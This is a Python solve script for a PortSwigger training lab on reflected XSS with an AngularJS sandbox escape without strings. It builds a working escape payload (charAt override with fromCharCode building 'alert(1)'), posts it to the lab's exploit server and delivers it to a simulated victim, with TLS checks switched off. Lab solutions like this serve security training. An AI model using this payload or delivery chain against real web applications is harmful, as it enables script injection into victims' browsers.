#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab: Reflected XSS with AngularJS sandbox escape without strings
Delivers a sandbox-escape payload via the exploit server using charAt override + fromCharCode.
"""

import argparse
import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def main():
    parser = argparse.ArgumentParser(
        description="Solve XSS Lab 25: AngularJS sandbox escape without strings"
    )
    parser.add_argument("lab_url", help="Lab URL (e.g. https://0aXX00...web-security-academy.net)")
    parser.add_argument("exploit_server", help="Exploit server URL (e.g. https://exploit-0aXX00...web-security-academy.net)")
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")
    exploit = args.exploit_server.rstrip("/")
    s = requests.Session()
    s.verify = False

    # The AngularJS sandbox escape payload
    # charAt override breaks sandbox, fromCharCode builds "x=alert(1)" without strings
    # orderBy filter executes the constructed function
    payload_url = (
        f"{lab}/?search=1&toString().constructor.prototype.charAt%3d[].join;"
        "[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1"
    )

    poc = f"<script>\nlocation='{payload_url}';\n</script>"
    print(f"[+] Exploit payload URL:\n    {payload_url}")

    def exploit_action(action):
        return s.post(f"{exploit}/", data={
            "urlIsHttps": "true",
            "responseFile": "/exploit",
            "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8",
            "responseBody": poc,
            "formAction": action,
        })

    exploit_action("STORE")
    print("[+] Exploit stored on exploit server")

    exploit_action("DELIVER_TO_VICTIM")
    print("[+] Exploit delivered to victim")

    # Check if lab is solved
    r = s.get(lab)
    if "Congratulations" in r.text:
        print("[+] Lab solved!")
    else:
        print("[*] Check lab page — may take a moment for the victim to visit")


if __name__ == "__main__":
    main()
